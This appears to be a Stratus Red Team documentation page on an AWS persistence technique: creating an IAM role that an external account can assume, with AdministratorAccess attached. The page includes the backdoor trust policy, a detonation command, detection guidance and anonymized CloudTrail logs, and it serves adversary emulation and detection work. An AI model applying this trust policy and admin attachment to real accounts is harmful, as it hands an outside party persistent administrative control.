---
title: Create a backdoored IAM Role
---

# Create a backdoored IAM Role




Platform: AWS

## Mappings

- MITRE ATT&CK
    - Persistence


- Threat Technique Catalog for AWS:
  
    - [Account Manipulation: Additional Cloud Roles](https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1098.003.html) (T1098.003)
  


## Description


Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from 
an external, fictitious attack AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: None.

<span style="font-variant: small-caps;">Detonation</span>: 

- Create a new IAM role with the following trust policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

- Attach the 'AdministratorAccess' managed IAM policy to it. 

*Note: For safety reasons, the detonation code makes sure that this role has no real effective permissions, by attaching a permissions boundary denying all actions. This could also be achieved with an inline role policy, but using a permissions boundary allows us to use a single API call (CreateRole).*

References:

- https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me
- https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.persistence.iam-create-backdoor-role
```
## Detection


- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.

- Identify a call to <code>CreateRole</code> closely followed by <code>AttachRolePolicy</code> with an administrator policy.

- Identify a call to <code>CreateRole</code> that contains an assumeRolePolicyDocument in the requestParameters that allows access from an external AWS account. Sample event:

```
{
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateRole",
  "requestParameters": {
	"roleName": "malicious-iam-role",
	"assumeRolePolicyDocument": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}"
   }
}
```



## Detonation logs <span class="smallcaps w3-badge w3-light-green w3-round w3-text-sand">new!</span>

The following CloudTrail events are generated when this technique is detonated[^1]:


- `iam:AttachRolePolicy`

- `iam:CreateRole`


??? "View raw detonation logs"

    ```json hl_lines="6 40"

    [
	   {
	      "awsRegion": "sagov-west-2r",
	      "eventCategory": "Management",
	      "eventID": "39480357-0a1d-4531-a3f2-71be4c041c25",
	      "eventName": "AttachRolePolicy",
	      "eventSource": "iam.amazonaws.com",
	      "eventTime": "2024-08-01T13:37:41Z",
	      "eventType": "AwsApiCall",
	      "eventVersion": "1.09",
	      "managementEvent": true,
	      "readOnly": false,
	      "recipientAccountId": "609418236337",
	      "requestID": "09b3fc1c-c0c0-4e86-9bad-e0928a089e0d",
	      "requestParameters": {
	         "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
	         "roleName": "stratus-red-team-malicious-iam-role"
	      },
	      "responseElements": null,
	      "sourceIPAddress": "209.209.254.254",
	      "tlsDetails": {
	         "cipherSuite": "TLS_AES_128_GCM_SHA256",
	         "clientProvidedHostHeader": "iam.amazonaws.com",
	         "tlsVersion": "TLSv1.3"
	      },
	      "userAgent": "stratus-red-team_e2808a95-acc5-4508-b083-d31d6f4315d9",
	      "userIdentity": {
	         "accessKeyId": "AKIA0W5KI69TY8X86BGT",
	         "accountId": "609418236337",
	         "arn": "arn:aws:iam::609418236337:user/christophe",
	         "principalId": "AIDAK4TRC24VBN0JX8JX",
	         "type": "IAMUser",
	         "userName": "christophe"
	      }
	   },
	   {
	      "awsRegion": "sagov-west-2r",
	      "eventCategory": "Management",
	      "eventID": "d2905ac3-9898-433f-b10d-9302abe4e208",
	      "eventName": "CreateRole",
	      "eventSource": "iam.amazonaws.com",
	      "eventTime": "2024-08-01T13:37:41Z",
	      "eventType": "AwsApiCall",
	      "eventVersion": "1.09",
	      "managementEvent": true,
	      "readOnly": false,
	      "recipientAccountId": "609418236337",
	      "requestID": "105d4d57-6f6d-43ce-b6a4-5b67c68b4ab5",
	      "requestParameters": {
	         "assumeRolePolicyDocument": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}",
	         "permissionsBoundary": "arn:aws:iam::aws:policy/AWSDenyAll",
	         "roleName": "stratus-red-team-malicious-iam-role"
	      },
	      "responseElements": {
	         "role": {
	            "arn": "arn:aws:iam::609418236337:role/stratus-red-team-malicious-iam-role",
	            "assumeRolePolicyDocument": "%7B%0A%20%20%22Version%22%3A%20%222012-10-17%22%2C%0A%20%20%22Statement%22%3A%20%5B%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%22Effect%22%3A%20%22Allow%22%2C%0A%20%20%20%20%20%20%22Principal%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%22AWS%22%3A%20%22arn%3Aaws%3Aiam%3A%3A193672423079%3Aroot%22%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%22Action%22%3A%20%22sts%3AAssumeRole%22%0A%20%20%20%20%7D%0A%20%20%5D%0A%7D",
	            "createDate": "Aug 1, 2024 1:37:41 PM",
	            "path": "/",
	            "permissionsBoundary": {
	               "permissionsBoundaryArn": "arn:aws:iam::aws:policy/AWSDenyAll",
	               "permissionsBoundaryType": "Policy"
	            },
	            "roleId": "AROA53G8Z8NGXMJ597G3E",
	            "roleName": "stratus-red-team-malicious-iam-role"
	         }
	      },
	      "sourceIPAddress": "209.209.254.254",
	      "tlsDetails": {
	         "cipherSuite": "TLS_AES_128_GCM_SHA256",
	         "clientProvidedHostHeader": "iam.amazonaws.com",
	         "tlsVersion": "TLSv1.3"
	      },
	      "userAgent": "stratus-red-team_e2808a95-acc5-4508-b083-d31d6f4315d9",
	      "userIdentity": {
	         "accessKeyId": "AKIA0W5KI69TY8X86BGT",
	         "accountId": "609418236337",
	         "arn": "arn:aws:iam::609418236337:user/christophe",
	         "principalId": "AIDAK4TRC24VBN0JX8JX",
	         "type": "IAMUser",
	         "userName": "christophe"
	      }
	   }
	]
    ```

[^1]: These logs have been gathered from a real detonation of this technique in a test environment using [Grimoire](https://github.com/DataDog/grimoire), and anonymized using [LogLicker](https://github.com/Permiso-io-tools/LogLicker).
